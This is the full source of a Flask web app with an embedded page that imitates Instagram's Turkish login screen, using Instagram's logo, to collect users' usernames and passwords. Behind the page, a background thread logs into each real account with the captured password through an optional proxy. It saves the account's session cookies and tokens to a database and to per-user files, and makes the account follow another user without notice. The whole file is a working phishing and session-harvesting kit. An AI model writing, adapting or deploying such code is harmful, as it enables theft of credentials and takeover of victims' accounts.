import os
import threading
import time
import logging
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash
from dotenv import load_dotenv

# instagrapi import
from instagrapi import Client
from instagrapi.exceptions import (
    ChallengeRequired, 
    LoginRequired, 
    PleaseWaitFewMinutes,
    BadPassword,
    TwoFactorRequired
)

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///ig.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "anti-delay-v72")

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["5 per minute"]
)

db = SQLAlchemy(app)

# Proxy ayarı
PROXY_URL = os.getenv("PROXY_URL")  # "http://user:pass@host:port"

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False, index=True)
    password_hash = db.Column(db.String(255), nullable=False)
    status = db.Column(db.String(100), default="Beklemede")
    last_login = db.Column(db.DateTime)
    created_at = db.Column(db.DateTime, default=db.func.now())
    login_attempts = db.Column(db.Integer, default=0)
    session_data = db.Column(db.Text)  # instagrapi session'ı saklamak için

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

# Thread lock
db_lock = threading.Lock()

def create_client():
    """Yeni instagrapi client oluştur"""
    cl = Client()
    
    # Proxy ayarla
    if PROXY_URL:
        try:
            cl.set_proxy(PROXY_URL)
            logger.info(f"Proxy ayarlandı: {PROXY_URL}")
        except Exception as e:
            logger.warning(f"Proxy hatası: {e}")
    
    # Request timeout ayarları
    cl.request_timeout = 30
    
    return cl

def background_bot(username, password):
    """Instagrapi ile arka plan botu"""
    with app.app_context():
        cl = None
        
        with db_lock:
            acc = IGAccount.query.filter_by(username=username.lower()).first()
            if not acc:
                logger.error(f"Hesap bulunamadı: {username}")
                return
            
            acc.login_attempts += 1
            acc.status = "Giriş yapılıyor..."
            db.session.commit()
        
        try:
            cl = create_client()
            
            # Önceki session var mı kontrol et
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                if acc.session_data:
                    try:
                        cl.load_settings(acc.session_data)
                        logger.info(f"Önceki session yüklendi: {username}")
                    except:
                        pass
            
            # Login dene
            logger.info(f"Login deneniyor: {username}")
            cl.login(username, password)
            
            # Başarılı login
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                acc.status = "AKTİF ✅ - Giriş başarılı"
                acc.last_login = db.func.now()
                
                # Session'ı kaydet
                try:
                    acc.session_data = cl.get_settings()
                except:
                    pass
                    
                db.session.commit()
            
            logger.info(f"Login başarılı: {username}")
            
            # Instagram'ı takip et
            try:
                instagram_user_id = cl.user_id_from_username("instagram")
                cl.user_follow(instagram_user_id)
                logger.info(f"Instagram takip edildi: {username}")
                
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "AKTİF ✅ - Takip tamamlandı"
                    db.session.commit()
                    
            except Exception as e:
                logger.warning(f"Takip hatası: {e}")
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "AKTİF ✅ (Takip atlandı)"
                    db.session.commit()
            
            # Session'ı dosyaya da kaydet (yedek)
            try:
                session_file = f"sessions/{username}.json"
                os.makedirs("sessions", exist_ok=True)
                cl.dump_settings(session_file)
            except:
                pass
                
        except ChallengeRequired:
            logger.warning(f"Challenge required: {username}")
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                acc.status = "ONAY GEREKİYOR ⚠️ - Telefon/Email doğrulaması"
                db.session.commit()
                
        except TwoFactorRequired:
            logger.warning(f"2FA gerekli: {username}")
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                acc.status = "2FA GEREKİYOR ⚠️ - İki faktörlü doğrulama"
                db.session.commit()
                
        except BadPassword:
            logger.warning(f"Yanlış şifre: {username}")
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                acc.status = "HATA ❌ - Yanlış şifre"
                db.session.commit()
                
        except PleaseWaitFewMinutes:
            logger.warning(f"Rate limit: {username}")
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                acc.status = "BEKLEME ⏳ - Çok fazla deneme, 10dk sonra tekrar dene"
                db.session.commit()
                
        except LoginRequired:
            logger.error(f"Login required hatası: {username}")
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                acc.status = "HATA ❌ - Giriş başarısız (Cookie hatası)"
                db.session.commit()
                
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Beklenmeyen hata ({username}): {error_msg}")
            
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                
                if "checkpoint" in error_msg.lower():
                    acc.status = "ONAY GEREKİYOR ⚠️ - Güvenlik kontrolü"
                elif "password" in error_msg.lower():
                    acc.status = "HATA ❌ - Şifre hatalı"
                elif "network" in error_msg.lower():
                    acc.status = "HATA ❌ - Ağ bağlantısı"
                else:
                    acc.status = f"HATA ❌ - {error_msg[:50]}"
                    
                db.session.commit()
        
        finally:
            # Client'ı temizle
            if cl:
                try:
                    cl.logout()
                except:
                    pass

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
@limiter.limit("3 per minute")
def connect():
    try:
        data = request.json
        username = data.get('u', '').strip().lower()
        password = data.get('p', '')
        
        if not username or not password:
            return jsonify(status="error", message="Kullanıcı adı ve şifre gerekli"), 400
        
        if len(password) < 6:
            return jsonify(status="error", message="Şifre çok kısa"), 400
        
        with db_lock:
            acc = IGAccount.query.filter_by(username=username).first()
            
            if not acc:
                acc = IGAccount(username=username, status="Yeni Kayıt")
                acc.set_password(password)
                db.session.add(acc)
            else:
                acc.set_password(password)
                acc.status = "Bağlanıyor..."
            
            db.session.commit()
        
        # Background thread
        thread = threading.Thread(
            target=background_bot,
            args=(username, password),
            daemon=True
        )
        thread.start()
        
        return jsonify(status="started", username=username)
        
    except Exception as e:
        logger.error(f"Connect error: {e}")
        return jsonify(status="error", message="Sunucu hatası"), 500

@app.route('/api/status/<username>')
def get_status(username):
    try:
        acc = IGAccount.query.filter_by(username=username.lower()).first()
        if not acc:
            return jsonify(status="Bilinmiyor", exists=False)
        
        return jsonify(
            status=acc.status,
            exists=True,
            attempts=acc.login_attempts,
            last_login=acc.last_login.isoformat() if acc.last_login else None
        )
    except Exception as e:
        return jsonify(status="Hata", error=str(e)), 500

@app.route('/api/reset/<username>', methods=['POST'])
def reset_status(username):
    with db_lock:
        acc = IGAccount.query.filter_by(username=username.lower()).first()
        if acc:
            acc.status = "Beklemede"
            acc.login_attempts = 0
            db.session.commit()
            return jsonify(status="reset")
        return jsonify(status="not_found"), 404

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .page { display: none; opacity: 0; transition: opacity 0.3s ease-in-out; }
        .active { display: block; opacity: 1; }
        .shake { animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #9333ea;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .fade-in { animation: fadeIn 0.5s ease-in; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-[#fafafa] min-h-screen font-sans antialiased">

    <!-- Login Page -->
    <div id="p1" class="page active flex flex-col items-center justify-center min-h-screen p-4">
        <div class="bg-white border border-gray-300 p-8 w-full max-w-[350px] flex flex-col items-center shadow-sm rounded-sm">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" 
                 class="w-44 mb-8 select-none" alt="Instagram" draggable="false">
            
            <form id="loginForm" class="w-full space-y-2" onsubmit="return false;">
                <div class="relative">
                    <input id="u" type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" 
                           class="w-full p-2.5 bg-gray-50 border border-gray-300 rounded-[3px] text-xs outline-none 
                                  focus:border-gray-400 focus:bg-white transition-all"
                           autocomplete="username">
                </div>
                
                <div class="relative">
                    <input id="p" type="password" placeholder="Şifre" 
                           class="w-full p-2.5 bg-gray-50 border border-gray-300 rounded-[3px] text-xs outline-none 
                                  focus:border-gray-400 focus:bg-white transition-all"
                           autocomplete="current-password">
                    <button type="button" onclick="togglePassword()" 
                            class="absolute right-3 top-2.5 text-gray-600 text-xs font-semibold hover:text-gray-800 hidden" 
                            id="togglePass">Göster</button>
                </div>
                
                <button onclick="giris()" id="btn" 
                        class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white py-1.5 rounded-[8px] font-semibold 
                               text-sm mt-2 transition-all active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed
                               flex items-center justify-center h-8">
                    <span id="btnText">Giriş Yap</span>
                    <div id="btnLoader" class="loader hidden"></div>
                </button>
                
                <div class="flex items-center my-4">
                    <div class="flex-1 h-px bg-gray-300"></div>
                    <span class="px-4 text-gray-500 text-xs font-semibold uppercase">veya</span>
                    <div class="flex-1 h-px bg-gray-300"></div>
                </div>
                
                <button type="button" class="w-full flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm mb-4">
                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/></svg>
                    Facebook ile Giriş Yap
                </button>
            </form>
            
            <a href="#" class="text-[#00376b] text-xs mt-2 mb-4">Şifreni mi unuttun?</a>
        </div>
        
        <div class="bg-white border border-gray-300 p-6 w-full max-w-[350px] mt-2 text-center rounded-sm">
            <p class="text-sm">Hesabın yok mu? <a href="#" class="text-[#0095f6] font-semibold">Kaydol</a></p>
        </div>
        
        <p class="mt-4 text-sm">Uygulamayı indir.</p>
        <div class="flex gap-2 mt-4">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd8971d.png" class="h-10" alt="App Store">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" class="h-10" alt="Google Play">
        </div>
    </div>

    <!-- Status Page -->
    <div id="p2" class="page min-h-screen bg-gray-50">
        <div class="p-6 max-w-md mx-auto fade-in">
            <h1 class="text-center font-black text-purple-600 mb-6 text-3xl italic tracking-tighter drop-shadow-sm">ALLFOLLOW</h1>
            
            <div class="bg-white p-8 rounded-[35px] shadow-2xl border-b-[6px] border-purple-500 text-center mb-6 
                        transform transition-all hover:scale-[1.01] relative overflow-hidden">
                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-400 via-pink-500 to-purple-600"></div>
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-3 tracking-[0.2em]">Sistem Durumu</p>
                <div class="flex items-center justify-center gap-3 mb-2">
                    <div id="statusIcon" class="w-3 h-3 bg-yellow-400 rounded-full animate-pulse shadow-lg"></div>
                    <h2 id="msg" class="text-xl font-black text-purple-600 italic tracking-tight">BAĞLANILIYOR...</h2>
                </div>
                <p id="subMsg" class="text-[11px] text-gray-400 font-medium">Lütfen bekleyin, bu işlem birkaç dakika sürebilir</p>
            </div>

            <div class="bg-white p-5 rounded-2xl border border-gray-200 flex items-center justify-between shadow-sm mb-4 hover:shadow-md transition-shadow">
                <div>
                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-wider mb-0.5">Hoş geldin</p>
                    <p id="utag" class="font-black text-gray-800 text-lg tracking-tight"></p>
                </div>
                <div class="w-12 h-12 bg-gradient-to-br from-purple-100 via-pink-50 to-purple-100 rounded-xl flex items-center 
                            justify-center text-purple-600 font-bold italic shadow-inner text-lg border border-purple-100">IG</div>
            </div>

            <div class="bg-white p-4 rounded-2xl border border-gray-200 shadow-sm space-y-3">
                <div class="flex justify-between items-center text-sm border-b border-gray-100 pb-2">
                    <span class="text-gray-500 text-xs font-medium uppercase">Deneme Sayısı</span>
                    <span id="attempts" class="font-bold text-purple-600 bg-purple-50 px-2 py-0.5 rounded-full text-xs">0</span>
                </div>
                <div class="flex justify-between items-center text-sm">
                    <span class="text-gray-500 text-xs font-medium uppercase">Son Güncelleme</span>
                    <span id="lastUpdate" class="font-semibold text-gray-700 text-xs">-</span>
                </div>
            </div>

            <div class="mt-6 space-y-3">
                <button onclick="checkNow()" id="checkBtn"
                        class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-xl font-semibold 
                               transition-all active:scale-[0.98] text-sm shadow-lg shadow-purple-200">
                    Şimdi Kontrol Et
                </button>
                <button onclick="location.reload()" 
                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-700 py-3 rounded-xl font-semibold 
                               transition-all active:scale-[0.98] text-sm">
                    Yeniden Başla
                </button>
            </div>
            
            <p class="text-center text-[10px] text-gray-400 mt-6">© 2024 AllFollow - Instagram otomasyon aracı</p>
        </div>
    </div>

    <script>
        let currentUser = "";
        let statusInterval = null;
        let isChecking = false;
        
        // Şifre göster/gizle
        document.getElementById('p').addEventListener('input', function() {
            document.getElementById('togglePass').style.display = this.value ? 'block' : 'none';
        });
        
        function togglePassword() {
            const input = document.getElementById('p');
            const btn = document.getElementById('togglePass');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = 'Gizle';
            } else {
                input.type = 'password';
                btn.textContent = 'Göster';
            }
        }

        function showError(msg) {
            const existing = document.querySelector('.error-toast');
            if (existing) existing.remove();
            
            const toast = document.createElement('div');
            toast.className = 'error-toast bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-lg text-xs text-center mb-4 shake';
            toast.innerHTML = `<span class="font-semibold">Hata:</span> ${msg}`;
            
            const form = document.getElementById('loginForm');
            form.insertBefore(toast, form.firstChild);
            
            setTimeout(() => toast.remove(), 5000);
        }

        async function giris() {
            if (isChecking) return;
            
            const u = document.getElementById('u').value.trim();
            const p = document.getElementById('p').value;
            const btn = document.getElementById('btn');
            const btnText = document.getElementById('btnText');
            const btnLoader = document.getElementById('btnLoader');

            if (!u || !p) {
                showError('Lütfen kullanıcı adı ve şifre girin');
                return;
            }

            isChecking = true;
            btn.disabled = true;
            btnText.classList.add('hidden');
            btnLoader.classList.remove('hidden');

            try {
                const response = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p})
                });

                const data = await response.json();

                if (data.status === 'error') {
                    throw new Error(data.message);
                }

                currentUser = u;
                
                // Geçiş animasyonu
                document.getElementById('p1').classList.remove('active');
                setTimeout(() => {
                    document.getElementById('p2').classList.add('active');
                    document.getElementById('utag').innerText = '@' + u;
                    startStatusPolling();
                }, 300);

            } catch (error) {
                showError(error.message || 'Bağlantı hatası');
                btn.disabled = false;
                btnText.classList.remove('hidden');
                btnLoader.classList.add('hidden');
                isChecking = false;
            }
        }

        function startStatusPolling() {
            checkStatus(); // İlk kontrol
            statusInterval = setInterval(checkStatus, 4000); // Her 4 saniye
            
            // 10 dakika sonra otomatik durdur
            setTimeout(() => {
                if (statusInterval) {
                    clearInterval(statusInterval);
                    document.getElementById('subMsg').textContent = "Otomatik kontrol durduruldu. Manuel kontrol edebilirsiniz.";
                }
            }, 600000);
        }

        async function checkNow() {
            if (isChecking) return;
            isChecking = true;
            const btn = document.getElementById('checkBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="loader border-white border-t-transparent w-4 h-4 mr-2"></div> Kontrol ediliyor...';
            
            await checkStatus();
            
            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = 'Şimdi Kontrol Et';
                isChecking = false;
            }, 1000);
        }

        async function checkStatus() {
            if (!currentUser) return;
            
            try {
                const response = await fetch('/api/status/' + currentUser);
                const data = await response.json();
                
                if (!data.exists) return;
                
                const msgEl = document.getElementById('msg');
                const iconEl = document.getElementById('statusIcon');
                const subMsg = document.getElementById('subMsg');
                
                // Metin güncelle
                msgEl.innerText = data.status.replace(/[✅⚠️❌⏳]/g, '').trim();
                document.getElementById('attempts').innerText = data.attempts || 0;
                document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString('tr-TR', {hour: '2-digit', minute:'2-digit'});
                
                // Durum renkleri ve ikonlar
                if (data.status.includes('✅')) {
                    msgEl.className = 'text-xl font-black text-green-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-green-500 rounded-full shadow-lg';
                    iconEl.classList.remove('animate-pulse');
                    subMsg.innerHTML = '<span class="text-green-600 font-semibold">Başarıyla tamamlandı!</span>';
                    subMsg.className = 'text-[11px] mt-1';
                    
                    // Başarılı olduğunda polling'i yavaşlat
                    if (statusInterval) {
                        clearInterval(statusInterval);
                        statusInterval = setInterval(checkStatus, 30000); // 30 saniyede bir
                    }
                } 
                else if (data.status.includes('⚠️')) {
                    msgEl.className = 'text-xl font-black text-orange-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-orange-500 rounded-full animate-bounce shadow-lg';
                    subMsg.innerHTML = '<span class="text-orange-600">Manuel müdahale gerekebilir. Instagram uygulamasını kontrol edin.</span>';
                } 
                else if (data.status.includes('❌')) {
                    msgEl.className = 'text-xl font-black text-red-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-red-500 rounded-full shadow-lg';
                    iconEl.classList.remove('animate-pulse');
                    subMsg.innerHTML = '<span class="text-red-600">Bir hata oluştu. Bilgilerinizi kontrol edip tekrar deneyin.</span>';
                }
                else if (data.status.includes('⏳')) {
                    msgEl.className = 'text-xl font-black text-blue-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-blue-500 rounded-full animate-pulse shadow-lg';
                }
                
            } catch (e) {
                console.error('Status check error:', e);
            }
        }

        // Enter tuşu desteği
        document.getElementById('p').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') giris();
        });
        document.getElementById('u').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') document.getElementById('p').focus();
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
        os.makedirs("sessions", exist_ok=True)
    
    port = int(os.getenv("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
